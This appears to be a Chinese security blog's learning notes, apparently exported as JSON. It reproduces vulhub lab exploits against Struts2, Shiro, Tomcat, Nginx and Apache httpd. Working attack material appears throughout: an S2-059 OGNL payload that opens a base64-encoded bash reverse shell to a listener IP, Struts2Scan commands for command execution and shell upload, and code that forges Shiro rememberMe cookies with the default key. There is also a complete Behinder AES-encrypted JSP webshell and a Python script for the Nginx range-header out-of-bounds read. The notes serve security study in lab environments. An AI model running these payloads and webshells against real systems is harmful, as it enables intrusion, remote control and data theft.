cd vulhub-master # 进入某一个漏洞/环境的目录 cd struts2/s2-005 # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 复现通过第三方工具 K8_Struts2_EXP 进行复现，可同时结合其它工具一同使用 监测漏洞 Struts2-Scan项目地址：https://github.com/HatBoy/Struts2-Scan #前置准备 需要安装第三方库 pip3 install click pip3 install requests pip3 install bs4 #单个URL漏洞检测 python3 /Users/ada/software/tools/struts2/Struts2-Scan-master/Struts2Scan.py -u http://www.security.ada:8080/example/HelloWorld.action #批量漏洞检测 python3 Struts2Scan.py -f urls.txt #POST数据 python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&amp;email=admin&amp;age={exp} # 命令执行 如果提示 暂不支持{name}漏洞利用 需要进入Struts2Scan.py 找到关键字后把判断条件的代码注释了即可 $ python3 /Users/ada/software/tools/struts2/Struts2-Scan-master/Struts2Scan.py -u http://www.security.ada:8080/example/HelloWorld.action -n S2-016 --exec # 反弹shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 [*] 请在反弹地址处监听端口如: nc -lvvp 8080 # 获取WEB路径 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath [*] /usr/local/tomcat/webapps/ROOT/ # 上传shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp [+] 文件上传成功! s2-059简介Struts2 s2-059远程代码执行漏洞(CVE-2019-0230)Apache Struts框架,会对某些特定的标签的属性值,比如id屌性进行二次解析,所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式,造成OGNL表达式注入。从而可能造成远程执行代码。 影响版本Struts 2.0.0-Struts 2.5.20参考链接 https://cwiki.apache.org/confluence/display/ww/s2-059 https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/ 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd struts2/s2-059 # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 复现验证是否存在漏洞# payload 将 %{3*9} 进行 url 编码 http://www.security.ada:8080/?id=%25%7B3*9%7D 反弹shell参考：https://www.cnblogs.com/bonelee/p/11021996.html linux安装netcat：https://www.cnblogs.com/zk1023/p/11935965.html # 1.安装gcc yum install -y gcc #2.下载 cd /usr/local/src/ wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz # 3.解压 tar -zxvf netcat-0.7.1.tar.gz -C /usr/local # 4.编译的时候用来指定程序存放路径 cd /usr/local/netcat-0.7.1 ./configure --prefix=/usr/local/netcat make &amp;&amp; make install # 5.添加配置 vim /etc/profile export NETCAT_HOME=/usr/local/netcat export PATH=$PATH:$NETCAT_HOME/bin #6.立即生效 source /etc/profile #7.测试 nc --help 或 netcat --help #8.此处的/usr/local/netcat−0.7.1/相当于源码文件，安装成功的文件是/usr/local/netcat，这里可以将/usr/local/netcat−0.7.1/删除 cd .. rm -rf netcat-0.7.1/ base64在线编码：http://www.jackson-t.ca/runtime-exec-payloads.html 将 bash -i &gt;&amp; /dev/tcp/192.168.1.1/6666 0&gt;&amp;1 中的ip和端口进行替换编码后放在data2 中的 exec（）函数进行传参 import requests url = \"http://www.security.ada:8080\" data1 = { \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\" } data2 = { \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}'))}\" } res1 = requests.post(url, data=data1) # print(res1.text) res2 = requests.post(url, data=data2) # print(res2.text)","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"远程代码执行","slug":"远程代码执行","permalink":"https://www.adalucky.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://www.adalucky.com/tags/%E5%8F%8D%E5%BC%B9shell/"}],"author":"Ada"},{"title":"Shiro","slug":"Security/Apache Shiro","date":"2021-08-18T07:52:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/apache-shiro/","link":"","permalink":"https://www.adalucky.com/security/apache-shiro/","excerpt":"Apache Shiro是一款开源安全框架,提供身份验证、授权、密码学和会话管理。 Shiro框架直观、易用,同时也能提供健壮的安全性。Apache Shiro1.2.4及以前版本中,加密的用户信息序列化后存储在名为 remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户 Cookie,触发Java反序列化漏洞,进而在目标机器上执行任意命令,","text":"Apache Shiro是一款开源安全框架,提供身份验证、授权、密码学和会话管理。 Shiro框架直观、易用,同时也能提供健壮的安全性。Apache Shiro1.2.4及以前版本中,加密的用户信息序列化后存储在名为 remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户 Cookie,触发Java反序列化漏洞,进而在目标机器上执行任意命令, 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 Shiro 550演示环境：shiro/CVE-2016-4437 如果 rememberMe的AES加密密钥泄露,无论 shiro是什么版本都会导致反序列化漏洞。 shro反序列化的特征:在返回包的Set- Cookie中存在 rememberMe= deleteMe字段。 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd shiro/CVE-2016-4437 # 自动化编译环境 docker-compose build #执行如下命令启动一个使用了 Apache Shiro1.2.4的Web服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v Shiro反序列化加解密流程 Remember me的内容进行一系列处理 使用Java序列化-&gt;使用密钥进行AES加密-&gt;Base64加密 得到加密后的 Remember Me内容 同时在识别用户身份的时候,需要对 Remember Me的字段进行解密,解密的顺序为 Remember Me加密内容—&gt;Base64解密 使用密钥进行AES解密-&gt;Java反序列化 使用 Shiro内置的默认密钥对 Payload进行加密 package shiro; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.codec.CodecSupport; import org.apache.shiro.util.ByteSource; import org.apache.shiro.codec.Base64; import org.apache.shiro.io.DefaultSerializer; import java.nio.file.FileSystems; import java.nio.file.Files; import java.nio.file.Paths; public class TestRemember { public static void main(String[] args) throws Exception { byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(\"d://poc.ser\")); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(CodecSupport.toBytes(\"kPH+bIxk5D2deZiIxcaaaA==\")); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } DNSlogDNSlog在web漏洞利用中已经是老生常谈的问题,简单理解就是在某些==无法直接利用漏洞获得回显的情况下==,但是目标可以发起DNS请求,这个候就可以通过这种方式把想获得的数据外带出来。 公共平台：http://www.dnslog.cn http://ceye.io 利用方式： 布尔、时间盲注、命令执行 漏洞复现秘钥查看 命令执行 修复建议 生成新的秘钥加密 在shro的配置文件里,引用 GenerateCipherKey的 generateNewKey方法随机生成秘钥 Shiro-721Shiro Padding Oracle Attack (Shiro-721) 漏洞原理由于 Apache Shiro cookie中通过AES-128-CBC模式加密的 rememberMe字段存在问题,用户可通过 Padding Oracle加密生成的攻击代码来构造恶意的 rememberMe字段,并重新请求网站,进行反序列化攻击,最终导致任意代码执行。 影响版本Apache Shiro&lt;1.4.2版本 启动可参考：https://blog.csdn.net/qq_43645782/article/details/106060334首先从https://github.com/inspiringz/shiro-721下载文件,其中比较重要的就是一个Shiro-721-master/Docker/src下的war文件 # --rm 后加上 IMAGE ID docker run -dt --name docker_shiro_tomcat -p 8080:8080 --rm 458575a05d97 # 将samples-web-1.4.1.war文件复制到webapps中 docker cp ./samples-web-1.4.1.war docker_shiro_tomcat:/usr/local/tomcat/webapps 漏洞复现获取rememberMe的值 可通过浏览器的F12 或者 BurpSuite 截包获取 rememberMe 的值 利用我这里没有复现成功，第一是我部署在云服务器的，本地没有开内外网穿透不好进行反弹，第二是我这款软件那个反弹的下拉框哪里选不起，可能根我的Java环境有关 Shiro 认证漏洞Apache Shiro认证绕过漏洞（目录穿越）:CVE-2020-1957Apache Shiro是一款开源安全框架,提供身份验证、授权、密码学和会话管理。 shiro框架直观、易用,同时也能提供健壮的安全性,在 Apache Shiro1.5.2以前的版本中,在使用 Spring动态控制器时,攻击者通过构造..;这样的跳转,可以绕过Shiro中对目录的权限限制 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd shiro/CVE-2020-1957 # 自动化编译环境 docker-compose build #执行如下命令启动一个搭载 Spring 2.2.2与 Shiro1.5.1的应用 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 漏洞复现#payload http://www.security.ada:8080/xxx/..;/admin/","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"Shiro 550","slug":"Shiro-550","permalink":"https://www.adalucky.com/tags/Shiro-550/"},{"name":"Shiro 721","slug":"Shiro-721","permalink":"https://www.adalucky.com/tags/Shiro-721/"},{"name":"认证漏洞","slug":"认证漏洞","permalink":"https://www.adalucky.com/tags/%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E/"}],"author":"Ada"},{"title":"Tomcat","slug":"Security/Tomcat","date":"2021-08-18T05:55:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/tomcat/","link":"","permalink":"https://www.adalucky.com/security/tomcat/","excerpt":"Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。","text":"Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 Tomcat启动演示环境为Tomcat8 # 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd tomcat/tomcat8 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 环境说明Tomcat支持在后台部署war文件,可以直接将 webshe部署到web目录下。其中,欲访问后台,需要对应用户有相应权限。在conf/tomcat-users.xml文件中配置用户的权限Tomcat7+权限分为 manager(后台管理) manager-gui拥有htm页面权限 manager- status拥有查看 status的权限 manager- script拥有text接口的权限,和 status权限 manager-jmx拥有jmx权限,和 status权限 host- manager(虚拟主机管理） admin-gui拥有html页面权限 admin- script拥有text接口权限 漏洞复现上传一句话木马将代码写入 shell.jsp 文件后 生成压缩包 .Zip文件后 修改后缀为 .war上传即可 &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt; &lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);} public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt; &lt;% if (request.getMethod().equals(\"POST\")){ String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\",k); String uploadString= request.getReader().readLine(); Cipher c=Cipher.getInstance(\"AES\"); c.init(2,new SecretKeySpec(k.getBytes(),\"AES\")); /*将sun.misc.Decoder转换成ASCII码*/ int[] aa=new int[]{115,117,110,46,109,105,115,99,46,66,65,83,69,54,52,68,101,99,111,100,101,114}; String ccstr=\"\"; for (int i = 0;i&lt;aa.length;i++) { ccstr=ccstr+(char)aa[i]; } Class clazz = Class.forName(ccstr); //获取到 Class 对象,即sun.misc.Decoder byte[] ss= (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), uploadString); Object myLoader= new U(this.getClass().getClassLoader()).g(c.doFinal(ss)).newInstance(); myLoader.equals(pageContext); } %&gt; 冰蝎连接连接的密码由shell.jsp文件中配置提供的","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"冰蝎连接","slug":"冰蝎连接","permalink":"https://www.adalucky.com/tags/%E5%86%B0%E8%9D%8E%E8%BF%9E%E6%8E%A5/"},{"name":"上传一句话木马","slug":"上传一句话木马","permalink":"https://www.adalucky.com/tags/%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"}],"author":"Ada"},{"title":"Nginx漏洞","slug":"Security/Nginx","date":"2021-08-13T10:53:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/nginx/","link":"","permalink":"https://www.adalucky.com/security/nginx/","excerpt":"Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。","text":"Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 简介NginxNginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。 代理引用：https://blog.csdn.net/qq_39429962/article/details/83618746 代理技术在nginx中占着举足轻重的地位，这是由于nginx中许多应用都是从代理服务中衍生出来的，如负载均衡。 扩充（流量转发工具）： lcx netcat EW NPS FRP 正向代理代理也被称为正向代理，是一个位于客户端和目标服务器之间的代理服务器，客户端将发送的请求和制定的目标服务器都提交给代理服务器，然后代理服务器向目标服务器发起请求，并将获得的结果返回给客户端的过程，就上通过代理上 Google 流程如下图: 反向代理相对于代理服务，反向代理的对象就是服务器，即代理服务代理的时服务器而不是客户端，它的作用现在是代替服务器接受请求，而不在像正向代理那样代理客户端。就像 ping baidu.com 过程图如下： 练习文件名逻辑漏洞Nginx 文件名逻辑漏洞：nginx/CVE-2013-4547 启动影响版本：Nginx 0.8.41~1.4.3 / 1.5.0~1.5.7 # 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd nginx/CVE-2013-4547 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 前置说明这个漏洞其实和代码执行没有太大关系,其主要原因是错误地解析了请求的 URI ,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。举个例子,比如, Nginx 匹配到 php 结尾的请求,就发送给 fastcgi 进行解析,常见的写法如下 Location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1: 9000; fastcgi index index. php: fastcgi_param SCRIPT_FILENAME /var/www/htmlsfastcgi_script_name fastcgi_param DOCUMENT_ROOT /var/www/html; } 正常情况下(关闭 pathinfo 的情况下),只有 .php 后缀的文件才会被发送给 fastcgi解析。而存在CVE-2013-4547的情况下,我们请求1.gif[0×20][0×00].php,这个 URI 可以匹配上正则 .php$,可以进入这个 Location块;但进入后, Nginx却错误地认为请求的文件是1.gif[0x20],就设置其为 SCRIPT FILENAME的值发送给 fastcgi。fastcgi根据 SCRIPT FILENAME 的值进行解析,最后造成了解析漏洞,所以,我们只需要上传一个空格结尾的文件,即可使PHP解析。再举个例子,比如很多网站限制了允许访问后台的IP location /admin/ { allow127.0.0.1; deny all; } 我们可以请求如下 URI: /test[0x20]/../admin/index.php ,这个URI不会匹配上location后面的/ admin/,也就绕过了其中的 IP 验证;但最后请求的是 /test[0x20]/../admin/index.php 文件,也就是 /admin/index.php ,成功访问到后台。(这个前提是需要有一个目录叫 test 这是 Linux 系统的特点,如果有一个不存在的目录,则即使跳转到上一层,也会报文件不存在的错误, Windows下没有这个限制) 复现上传 访问访问的时候如果 BurpSuite 没有截到包，可以修改 gif-&gt;gix 然后在 BurpSuite 中再改回来 防御方法：升级 Nginx 版本 越界读取缓存漏洞Nginx 越界读取缓存漏洞： nginx/CVE-2017-7529 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd nginx/CVE-2017-7529 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 漏洞说明 Nginx 在反向代理站点的时候,通常会将一些文件进行缓存,特别是静态文件。缓存的部分存储在文件中,每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件,则Nginx会直接将该文件中的“HTTP返回包体”返回给用户 如果我的请求中包含 Range 头,Ngnx将会根据我指定的 start和 end 位置,返回指定长度的内容。而如果我构造了两个负的位置,如(-600 -9223372036854774591),将可能读取到负位置的数据。如果这次请求又命中了缓存文件,则可能就可以读取到缓存文件中位于“HTTP返回包体前的“文件头”、“HTTP返回包头”等内容 影响版本：Nginx version 0.5.6 -1.13.2 复现cur 是常用的命令行工具,用来请求 Web 服务器。它的名字就是客户端 (client) 的 URL 工具的意思。 curl用法:https://www.ruanyifeng.com/blog/2019/09/curl-reference.html python3 /Users/ada/Desktop/CVE-2017-7529.py http://www.security.ada:8080/ #!/usr/bin/env python import sys import requests if len(sys.argv) &lt; 2: print(\"%s url\" % (sys.argv[0])) print(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0])) sys.exit() headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\" } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers['Range'] = \"bytes=-%d,-%d\" % ( n, 0x8000000000000000 - n) r = requests.get(url, headers=headers) print(r.text) 设置了 range 域后返回的信息:可以看到服务器的一些信息,在这个模拟环境中还不能看岀信息的价值,但在某些重要生产环境中,被代理服务器的信息泄露是很严重的漏洞 可见,越界读取到了位于 “HTTP返回包体” 前的 “文件头”、“HTTP返回包头” 等内容","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"Nginx漏洞","slug":"Nginx漏洞","permalink":"https://www.adalucky.com/tags/Nginx%E6%BC%8F%E6%B4%9E/"},{"name":"文件逻辑漏洞","slug":"文件逻辑漏洞","permalink":"https://www.adalucky.com/tags/%E6%96%87%E4%BB%B6%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"越界读取缓存","slug":"越界读取缓存","permalink":"https://www.adalucky.com/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98/"}],"author":"Ada"},{"title":"Apache漏洞","slug":"Security/Apache漏洞","date":"2021-08-13T05:17:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/apache-lou-dong/","link":"","permalink":"https://www.adalucky.com/security/apache-lou-dong/","excerpt":"Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。","text":"Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 Apacheapache后缀解析漏洞原因 在 Apache2.0.X&lt;=2.0.59, Apache2.2x&lt;=2.2.17, Apache2.2.2&lt;=2.2.8 中 Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断 如 1.php.abc 因 apache 不识别 .abc 后缀,所以向前解析php 1.php.abc = 1.php test.php.owf.rar解析成 test.php 换行解析漏洞 Apache httpd 换行解析漏洞靶场：CVE-2017-15715 Apache httpd 是一款 HTTP 服务器,它可以通过 mod_php 来运行 PHP 网页。其2.4.0-2.4.29版本中存在一个解析漏洞,在解析 PHP 时,1.php\\x0a将被按照 PHP 后缀进行解析,导致绕过一些服务器的安全策略。 shell.php\\xOa –&gt; shell.php 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd httpd/CVE-2017-15715 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 漏洞复现 本靶场漏洞利用的是 Apache httpd 中的解析 \\0a 进行截断，在上图的文件上传的对文件的后缀是有一些限制的，如果上传文件为 shell.php 文件后缀是无法上传的只能将 filename的文件名改为 eval.php\\x0a 进行上传 但是改的操作有不能在本地进行，那么我们就通过 BurpSuite 